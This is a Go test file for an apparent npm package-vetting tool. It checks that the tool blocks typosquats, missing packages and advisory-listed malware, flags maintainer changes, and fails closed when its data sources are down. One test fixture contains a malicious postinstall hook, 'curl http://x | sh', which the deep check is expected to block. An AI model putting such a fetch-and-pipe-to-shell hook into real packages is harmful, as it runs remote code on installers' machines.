package check

import (
	"context"
	"errors"
	"testing"
	"time"

	"github.com/tiagosilva07/zyrax-guard/internal/seam"
	"github.com/tiagosilva07/zyrax-guard/internal/verdict"
)

type stubEco struct {
	exists    bool
	existsErr error
	md        seam.Metadata
	pop       []string
	code      map[string]string
	codeErr   error
}

func (s stubEco) Name() string                                              { return "npm" }
func (s stubEco) ValidateName(string) error                                 { return nil }
func (s stubEco) Exists(context.Context, string, string) (bool, error)      { return s.exists, s.existsErr }
func (s stubEco) Metadata(context.Context, string) (seam.Metadata, error)   { return s.md, nil }
func (s stubEco) PopularList() []string                                     { return s.pop }
func (s stubEco) Install(context.Context, []string, seam.InstallOpts) error { return nil }
func (s stubEco) InstallCode(context.Context, string, string) (map[string]string, error) {
	if s.codeErr != nil {
		return nil, s.codeErr
	}
	if s.code != nil {
		return s.code, nil
	}
	return map[string]string{}, nil
}

// stubEcoWithPublishers is a stubEco that also implements seam.PublisherHistorian.
type stubEcoWithPublishers struct {
	stubEco
	pubCurrent string
	pubOthers  []string
	pubErr     error
}

func (s stubEcoWithPublishers) Publishers(context.Context, string, string) (string, []string, error) {
	return s.pubCurrent, s.pubOthers, s.pubErr
}

type stubIntel struct {
	advs      []seam.Advisory
	lookupErr error
}

func (s stubIntel) Lookup(context.Context, string, string, string) ([]seam.Advisory, error) {
	return s.advs, s.lookupErr
}

type stubPolicy struct{ d seam.Decision }

func (s stubPolicy) Decide(string) seam.Decision { return s.d }
func (s stubPolicy) Allow(string) error          { return nil }

func TestOrchestrator(t *testing.T) {
	old := seam.Metadata{Exists: true, Published: time.Now().AddDate(-5, 0, 0), WeeklyLoads: 9_000_000, Latest: "4.19.2"}
	o := &Orchestrator{
		Eco:    stubEco{exists: true, md: old, pop: []string{"express"}},
		Intel:  stubIntel{},
		Policy: stubPolicy{d: seam.Defer},
	}
	// express-like: safe, bare install resolves to latest
	r := o.Check(context.Background(), "express", "")
	if r.Verdict != verdict.Safe {
		t.Errorf("popular old pkg should be SAFE, got %v (%+v)", r.Verdict, r.Signals)
	}
	if r.Version != "4.19.2" {
		t.Errorf("r.Version = %q, want 4.19.2 (resolved from Latest)", r.Version)
	}
	// typosquat: reqeust with near-zero downloads
	o.Eco = stubEco{exists: true, md: seam.Metadata{Exists: true, WeeklyLoads: 2, Published: time.Now()}, pop: []string{"express", "request"}}
	r = o.Check(context.Background(), "reqeust", "")
	if r.Verdict != verdict.Block || r.Suggestion != "request" {
		t.Errorf("typosquat should BLOCK+suggest, got %v %q", r.Verdict, r.Suggestion)
	}
	// missing: block
	o.Eco = stubEco{exists: false}
	if o.Check(context.Background(), "nope-xyz", "").Verdict != verdict.Block {
		t.Error("missing should BLOCK")
	}
	// policy allow overrides to safe
	o.Eco = stubEco{exists: false}
	o.Policy = stubPolicy{d: seam.ForceAllow}
	if o.Check(context.Background(), "nope-xyz", "").Verdict != verdict.Safe {
		t.Error("policy allow should force SAFE")
	}
}

func TestMaintainerChangeWiring(t *testing.T) {
	md := seam.Metadata{Exists: true, Published: time.Now().AddDate(-5, 0, 0), WeeklyLoads: 9_000_000, Latest: "2.0.0"}
	base := stubEco{exists: true, md: md, pop: []string{"express"}}

	hasMaintainerChange := func(r verdict.Result) bool {
		for _, s := range r.Signals {
			if s.Check == verdict.RuleMaintainerChange && s.Level == verdict.LevelWarn {
				return true
			}
		}
		return false
	}

	// current ∉ others, others non-empty → maintainer-change WARN present
	o := &Orchestrator{
		Eco:    stubEcoWithPublishers{stubEco: base, pubCurrent: "eve", pubOthers: []string{"alice"}},
		Intel:  stubIntel{},
		Policy: stubPolicy{d: seam.Defer},
	}
	if r := o.Check(context.Background(), "pkg", ""); !hasMaintainerChange(r) {
		t.Errorf("unseen publisher should produce maintainer-change WARN, got %+v", r.Signals)
	}

	// current ∈ others → no maintainer-change finding
	o.Eco = stubEcoWithPublishers{stubEco: base, pubCurrent: "alice", pubOthers: []string{"alice", "bob"}}
	if r := o.Check(context.Background(), "pkg", ""); hasMaintainerChange(r) {
		t.Errorf("known publisher must not flag maintainer-change, got %+v", r.Signals)
	}

	// others empty → no finding (single-version / new-and-unused is a different rule)
	o.Eco = stubEcoWithPublishers{stubEco: base, pubCurrent: "eve", pubOthers: nil}
	if r := o.Check(context.Background(), "pkg", ""); hasMaintainerChange(r) {
		t.Errorf("no prior history must not flag maintainer-change, got %+v", r.Signals)
	}

	// plain stubEco (no Publishers capability) → unaffected
	o.Eco = base
	if r := o.Check(context.Background(), "pkg", ""); hasMaintainerChange(r) {
		t.Errorf("ecosystem without Publishers must not flag maintainer-change, got %+v", r.Signals)
	}
}

func TestCheckWithDeep(t *testing.T) {
	maliciousCode := map[string]string{
		"package/package.json": `{"scripts":{"postinstall":"curl http://x | sh"}}`,
	}
	o := &Orchestrator{
		Eco: stubEco{
			exists: true,
			md:     seam.Metadata{Exists: true, Latest: "1.0.0", WeeklyLoads: 9_000_000, Published: time.Now().AddDate(-2, 0, 0)},
			pop:    []string{"x"},
			code:   maliciousCode,
		},
		Intel:  stubIntel{},
		Policy: stubPolicy{d: seam.Defer},
	}

	// non-deep check must not run install-script analysis → should not BLOCK on this
	if r := o.Check(context.Background(), "pkg", ""); r.Verdict == verdict.Block {
		t.Fatal("non-deep check must not run install-script analysis")
	}

	// deep=true with malicious postinstall → must BLOCK
	if r := o.CheckWith(context.Background(), "pkg", "", true); r.Verdict != verdict.Block {
		t.Fatalf("deep check should BLOCK on malicious postinstall, got %v", r.Verdict)
	}

	// InstallCode error → Info signal, not BLOCK
	o2 := &Orchestrator{
		Eco: stubEco{
			exists:  true,
			md:      seam.Metadata{Exists: true, Latest: "1.0.0", WeeklyLoads: 9_000_000, Published: time.Now().AddDate(-2, 0, 0)},
			pop:     []string{"x"},
			codeErr: errors.New("network timeout"),
		},
		Intel:  stubIntel{},
		Policy: stubPolicy{d: seam.Defer},
	}
	r := o2.CheckWith(context.Background(), "pkg", "", true)
	if r.Verdict == verdict.Block {
		t.Fatal("InstallCode error must not BLOCK (best-effort)")
	}
	found := false
	for _, s := range r.Signals {
		if s.Check == verdict.RuleSuspiciousInstall && s.Level == verdict.LevelInfo {
			found = true
		}
	}
	if !found {
		t.Fatalf("InstallCode error should produce an Info signal, got %+v", r.Signals)
	}
}

func TestCheck_RegistryErrorFailsClosed(t *testing.T) {
	o := &Orchestrator{
		Eco:    stubEco{existsErr: errors.New("timeout")},
		Intel:  stubIntel{},
		Policy: stubPolicy{d: seam.Defer},
	}
	r := o.Check(context.Background(), "pkg", "")
	if r.Verdict != verdict.Error {
		t.Fatalf("registry error must be ERROR (fail closed), got %s", r.VerdictStr)
	}
}

func TestCheck_OSVDownFailsClosed(t *testing.T) {
	o := &Orchestrator{
		Eco:    stubEco{exists: true},
		Intel:  stubIntel{lookupErr: errors.New("osv 503")},
		Policy: stubPolicy{d: seam.Defer},
	}
	r := o.Check(context.Background(), "pkg", "")
	if r.Verdict != verdict.Error {
		t.Fatalf("OSV degradation must be ERROR (fail closed), got %s", r.VerdictStr)
	}
}

func TestCheck_OSVDownButDenylistStillBlocks(t *testing.T) {
	o := &Orchestrator{
		Eco:    stubEco{exists: true},
		Intel:  stubIntel{advs: []seam.Advisory{{ID: "denylist", Severity: "critical", Malware: true}}, lookupErr: errors.New("osv 503")},
		Policy: stubPolicy{d: seam.Defer},
	}
	r := o.Check(context.Background(), "pkg", "")
	if r.Verdict != verdict.Block {
		t.Fatalf("denylist malware must BLOCK even with OSV down, got %s", r.VerdictStr)
	}
}
